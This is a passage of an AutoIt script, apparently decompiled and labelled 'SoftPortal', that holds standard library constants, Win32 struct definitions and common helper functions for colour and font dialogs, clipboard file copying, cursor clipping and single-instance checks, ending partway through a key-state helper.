#NoTrayIcon
#Region
	#AutoIt3Wrapper_OutFile=-.exe
	#AutoIt3Wrapper_Compression=4
	#AutoIt3Wrapper_Res_Description=SoftPortal
	#AutoIt3Wrapper_Res_Fileversion=1.1.0.0
#EndRegion
Global Const $fw_dontcare = 0
Global Const $fw_thin = 100
Global Const $fw_extralight = 200
Global Const $fw_ultralight = 200
Global Const $fw_light = 300
Global Const $fw_normal = 400
Global Const $fw_regular = 400
Global Const $fw_medium = 500
Global Const $fw_semibold = 600
Global Const $fw_demibold = 600
Global Const $fw_bold = 700
Global Const $fw_extrabold = 800
Global Const $fw_ultrabold = 800
Global Const $fw_heavy = 900
Global Const $fw_black = 900
Global Const $cf_effects = 256
Global Const $cf_printerfonts = 2
Global Const $cf_screenfonts = 1
Global Const $cf_noscriptsel = 8388608
Global Const $cf_inittologfontstruct = 64
Global Const $logpixelsx = 88
Global Const $logpixelsy = 90
Global Const $ansi_charset = 0
Global Const $arabic_charset = 178
Global Const $baltic_charset = 186
Global Const $chinesebig5_charset = 136
Global Const $default_charset = 1
Global Const $easteurope_charset = 238
Global Const $gb2312_charset = 134
Global Const $greek_charset = 161
Global Const $hangeul_charset = 129
Global Const $hebrew_charset = 177
Global Const $johab_charset = 130
Global Const $mac_charset = 77
Global Const $oem_charset = 255
Global Const $russian_charset = 204
Global Const $shiftjis_charset = 128
Global Const $symbol_charset = 2
Global Const $thai_charset = 222
Global Const $turkish_charset = 162
Global Const $vietnamese_charset = 163
Global Const $out_character_precis = 2
Global Const $out_default_precis = 0
Global Const $out_device_precis = 5
Global Const $out_outline_precis = 8
Global Const $out_ps_only_precis = 10
Global Const $out_raster_precis = 6
Global Const $out_string_precis = 1
Global Const $out_stroke_precis = 3
Global Const $out_tt_only_precis = 7
Global Const $out_tt_precis = 4
Global Const $clip_character_precis = 1
Global Const $clip_default_precis = 0
Global Const $clip_dfa_disable = 48
Global Const $clip_embedded = 128
Global Const $clip_lh_angles = 16
Global Const $clip_mask = 15
Global Const $clip_dfa_override = 64
Global Const $clip_stroke_precis = 2
Global Const $clip_tt_always = 32
Global Const $antialiased_quality = 4
Global Const $default_quality = 0
Global Const $draft_quality = 1
Global Const $nonantialiased_quality = 3
Global Const $proof_quality = 2
Global Const $cleartype_quality = 5
Global Const $default_pitch = 0
Global Const $fixed_pitch = 1
Global Const $variable_pitch = 2
Global Const $ff_decorative = 80
Global Const $ff_dontcare = 0
Global Const $ff_modern = 48
Global Const $ff_roman = 16
Global Const $ff_script = 64
Global Const $ff_swiss = 32
Global Const $fs_regular = 0
Global Const $fs_bold = 1
Global Const $fs_italic = 2
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
Global Const $taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
Global Const $taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
Global Const $taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
Global Const $taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
Global Const $taggdip_effectparams_sharpen = "float Radius; float Amount"
Global Const $taggdip_effectparams_tint = "int Hue; int Amount"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipcolormatrix = "float m[25]"
Global Const $taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $taggdipencoderparams = "uint Count;" & $taggdipencoderparam
Global Const $taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"

Func _winapi_getlasterror(Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($_icurrenterror, $_icurrentextended, $aresult[0])
EndFunc

Func _winapi_setlasterror($ierrorcode, Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
	Return SetError($_icurrenterror, $_icurrentextended, NULL )
EndFunc

Func __comerrorformating($ocomerror, $sprefix = @TAB)
	Local Const $str_striptrailing = 2
	Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror.scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror.number, 8) & " (" & $ocomerror.number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror.windescription, $str_striptrailing) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror.description, $str_striptrailing) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror.source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror.helpfile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror.helpcontext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror.lastdllerror & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror.retcode)
	Return $serror
EndFunc

Global Const $__miscconstant_cc_anycolor = 256
Global Const $__miscconstant_cc_fullopen = 2
Global Const $__miscconstant_cc_rgbinit = 1
Global Const $tagchoosecolor = "dword Size;hwnd hWndOwnder;handle hInstance;dword rgbResult;ptr CustColors;dword Flags;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName"
Global Const $tagchoosefont = "dword Size;hwnd hWndOwner;handle hDC;ptr LogFont;int PointSize;dword Flags;dword rgbColors;lparam CustData;" & "ptr fnHook;ptr TemplateName;handle hInstance;ptr szStyle;word FontType;int SizeMin;int SizeMax"

Func _choosecolor($ireturntype = 0, $icolorref = 0, $ireftype = 0, $hwndownder = 0)
	Local $tagcustcolors = "dword[16]"
	Local $tchoose = DllStructCreate($tagchoosecolor)
	Local $tcc = DllStructCreate($tagcustcolors)
	If $ireftype = 1 Then
		$icolorref = Int($icolorref)
	ElseIf $ireftype = 2 Then
		$icolorref = Hex(String($icolorref), 6)
		$icolorref = "0x" & StringMid($icolorref, 5, 2) & StringMid($icolorref, 3, 2) & StringMid($icolorref, 1, 2)
	EndIf
	DllStructSetData($tchoose, "Size", DllStructGetSize($tchoose))
	DllStructSetData($tchoose, "hWndOwnder", $hwndownder)
	DllStructSetData($tchoose, "rgbResult", $icolorref)
	DllStructSetData($tchoose, "CustColors", DllStructGetPtr($tcc))
	DllStructSetData($tchoose, "Flags", BitOR($__miscconstant_cc_anycolor, $__miscconstant_cc_fullopen, $__miscconstant_cc_rgbinit))
	Local $aresult = DllCall("comdlg32.dll", "bool", "ChooseColor", "struct*", $tchoose)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] = 0 Then Return SetError(-3, -3, -1)
	Local $scolor_picked = DllStructGetData($tchoose, "rgbResult")
	If $ireturntype = 1 Then
		Return "0x" & Hex(String($scolor_picked), 6)
	ElseIf $ireturntype = 2 Then
		$scolor_picked = Hex(String($scolor_picked), 6)
		Return "0x" & StringMid($scolor_picked, 5, 2) & StringMid($scolor_picked, 3, 2) & StringMid($scolor_picked, 1, 2)
	ElseIf $ireturntype = 0 Then
		Return $scolor_picked
	Else
		Return SetError(-4, -4, -1)
	EndIf
EndFunc

Func _choosefont($sfontname = "Courier New", $ipointsize = 10, $ifontcolorref = 0, $ifontweight = 0, $bitalic = False, $bunderline = False, $bstrikethru = False, $hwndowner = 0)
	Local $iitalic = 0, $iunderline = 0, $istrikeout = 0
	$ifontcolorref = BitOR(BitShift(BitAND($ifontcolorref, 255), -16), BitAND($ifontcolorref, 65280), BitShift(BitAND($ifontcolorref, 16711680), 16))
	Local $hdc = __misc_getdc(0)
	Local $iheight = Round(($ipointsize * __misc_getdevicecaps($hdc, $logpixelsx)) / 72, 0)
	__misc_releasedc(0, $hdc)
	Local $tchoosefont = DllStructCreate($tagchoosefont)
	Local $tlogfont = DllStructCreate($taglogfont)
	DllStructSetData($tchoosefont, "Size", DllStructGetSize($tchoosefont))
	DllStructSetData($tchoosefont, "hWndOwner", $hwndowner)
	DllStructSetData($tchoosefont, "LogFont", DllStructGetPtr($tlogfont))
	DllStructSetData($tchoosefont, "PointSize", $ipointsize)
	DllStructSetData($tchoosefont, "Flags", BitOR($cf_screenfonts, $cf_printerfonts, $cf_effects, $cf_inittologfontstruct, $cf_noscriptsel))
	DllStructSetData($tchoosefont, "rgbColors", $ifontcolorref)
	DllStructSetData($tchoosefont, "FontType", 0)
	DllStructSetData($tlogfont, "Height", $iheight)
	DllStructSetData($tlogfont, "Weight", $ifontweight)
	DllStructSetData($tlogfont, "Italic", $bitalic)
	DllStructSetData($tlogfont, "Underline", $bunderline)
	DllStructSetData($tlogfont, "Strikeout", $bstrikethru)
	DllStructSetData($tlogfont, "FaceName", $sfontname)
	Local $aresult = DllCall("comdlg32.dll", "bool", "ChooseFontW", "struct*", $tchoosefont)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] = 0 Then Return SetError(-3, -3, -1)
	Local $sfacename = DllStructGetData($tlogfont, "FaceName")
	If StringLen($sfacename) = 0 AND StringLen($sfontname) > 0 Then $sfacename = $sfontname
	If DllStructGetData($tlogfont, "Italic") Then $iitalic = 2
	If DllStructGetData($tlogfont, "Underline") Then $iunderline = 4
	If DllStructGetData($tlogfont, "Strikeout") Then $istrikeout = 8
	Local $iattributes = BitOR($iitalic, $iunderline, $istrikeout)
	Local $isize = DllStructGetData($tchoosefont, "PointSize") / 10
	Local $icolorref = DllStructGetData($tchoosefont, "rgbColors")
	Local $iweight = DllStructGetData($tlogfont, "Weight")
	Local $scolor_picked = Hex(String($icolorref), 6)
	Return StringSplit($iattributes & "," & $sfacename & "," & $isize & "," & $iweight & "," & $icolorref & "," & "0x" & $scolor_picked & "," & "0x" & StringMid($scolor_picked, 5, 2) & StringMid($scolor_picked, 3, 2) & StringMid($scolor_picked, 1, 2), ",")
EndFunc

Func _clipputfile($sfilepath, $sdelimiter = "|")
	Local Const $gmem_moveable = 2, $cf_hdrop = 15
	$sfilepath &= $sdelimiter & $sdelimiter
	Local $nglobmemsize = 2 * (StringLen($sfilepath) + 20)
	Local $aresult = DllCall("user32.dll", "bool", "OpenClipboard", "hwnd", 0)
	If @error OR $aresult[0] = 0 Then Return SetError(1, _winapi_getlasterror(), False)
	Local $ierror = 0, $ilasterror = 0
	$aresult = DllCall("user32.dll", "bool", "EmptyClipboard")
	If @error OR NOT $aresult[0] Then
		$ierror = 2
		$ilasterror = _winapi_getlasterror()
	Else
		$aresult = DllCall("kernel32.dll", "handle", "GlobalAlloc", "uint", $gmem_moveable, "ulong_ptr", $nglobmemsize)
		If @error OR NOT $aresult[0] Then
			$ierror = 3
			$ilasterror = _winapi_getlasterror()
		Else
			Local $hglobal = $aresult[0]
			$aresult = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hglobal)
			If @error OR NOT $aresult[0] Then
				$ierror = 4
				$ilasterror = _winapi_getlasterror()
			Else
				Local $hlock = $aresult[0]
				Local $tdropfiles = DllStructCreate("dword pFiles;" & $tagpoint & ";bool fNC;bool fWide;wchar[" & StringLen($sfilepath) + 1 & "]", $hlock)
				If @error Then Return SetError(5, 6, False)
				Local $tstruct = DllStructCreate("dword;long;long;bool;bool")
				DllStructSetData($tdropfiles, "pFiles", DllStructGetSize($tstruct))
				DllStructSetData($tdropfiles, "X", 0)
				DllStructSetData($tdropfiles, "Y", 0)
				DllStructSetData($tdropfiles, "fNC", 0)
				DllStructSetData($tdropfiles, "fWide", 1)
				DllStructSetData($tdropfiles, 6, $sfilepath)
				For $i = 1 To StringLen($sfilepath)
					If DllStructGetData($tdropfiles, 6, $i) = $sdelimiter Then DllStructSetData($tdropfiles, 6, Chr(0), $i)
				Next
				$aresult = DllCall("user32.dll", "handle", "SetClipboardData", "uint", $cf_hdrop, "handle", $hglobal)
				If @error OR NOT $aresult[0] Then
					$ierror = 6
					$ilasterror = _winapi_getlasterror()
				EndIf
				$aresult = DllCall("kernel32.dll", "bool", "GlobalUnlock", "handle", $hglobal)
				If (@error OR NOT $aresult[0]) AND NOT $ierror AND _winapi_getlasterror() Then
					$ierror = 8
					$ilasterror = _winapi_getlasterror()
				EndIf
			EndIf
			$aresult = DllCall("kernel32.dll", "ptr", "GlobalFree", "handle", $hglobal)
			If (@error OR $aresult[0]) AND NOT $ierror Then
				$ierror = 9
				$ilasterror = _winapi_getlasterror()
			EndIf
		EndIf
	EndIf
	$aresult = DllCall("user32.dll", "bool", "CloseClipboard")
	If (@error OR NOT $aresult[0]) AND NOT $ierror Then Return SetError(7, _winapi_getlasterror(), False)
	If $ierror Then Return SetError($ierror, $ilasterror, False)
	Return True
EndFunc

Func _mousetrap($ileft = 0, $itop = 0, $iright = 0, $ibottom = 0)
	Local $areturn = 0
	If $ileft = Default Then $ileft = 0
	If $itop = Default Then $itop = 0
	If $iright = Default Then $iright = 0
	If $ibottom = Default Then $ibottom = 0
	If @NumParams = 0 Then
		$areturn = DllCall("user32.dll", "bool", "ClipCursor", "ptr", 0)
		If @error OR NOT $areturn[0] Then Return SetError(1, _winapi_getlasterror(), False)
	Else
		If @NumParams = 2 Then
			$iright = $ileft + 1
			$ibottom = $itop + 1
		EndIf
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, "Left", $ileft)
		DllStructSetData($trect, "Top", $itop)
		DllStructSetData($trect, "Right", $iright)
		DllStructSetData($trect, "Bottom", $ibottom)
		$areturn = DllCall("user32.dll", "bool", "ClipCursor", "struct*", $trect)
		If @error OR NOT $areturn[0] Then Return SetError(2, _winapi_getlasterror(), False)
	EndIf
	Return True
EndFunc

Func _singleton($soccurrencename, $iflag = 0)
	Local Const $error_already_exists = 183
	Local Const $security_descriptor_revision = 1
	Local $tsecurityattributes = 0
	If BitAND($iflag, 2) Then
		Local $tsecuritydescriptor = DllStructCreate("byte;byte;word;ptr[4]")
		Local $aret = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "struct*", $tsecuritydescriptor, "dword", $security_descriptor_revision)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then
			$aret = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "struct*", $tsecuritydescriptor, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $aret[0] Then
				$tsecurityattributes = DllStructCreate($tagsecurity_attributes)
				DllStructSetData($tsecurityattributes, 1, DllStructGetSize($tsecurityattributes))
				DllStructSetData($tsecurityattributes, 2, DllStructGetPtr($tsecuritydescriptor))
				DllStructSetData($tsecurityattributes, 3, 0)
			EndIf
		EndIf
	EndIf
	Local $ahandle = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $tsecurityattributes, "bool", 1, "wstr", $soccurrencename)
	If @error Then Return SetError(@error, @extended, 0)
	Local $alasterror = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $alasterror[0] = $error_already_exists Then
		If BitAND($iflag, 1) Then
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $ahandle[0])
			If @error Then Return SetError(@error, @extended, 0)
			Return SetError($alasterror[0], $alasterror[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $ahandle[0]
EndFunc

Func _ispressed($shexkey, $vdll = "user32.dll")
	Local $a_r = DllCall($vdll, "short", "GetAsyncKeyState", "int", "0x" & $shexkey)
	If @error Then Return SetError(@error, @extended, False)
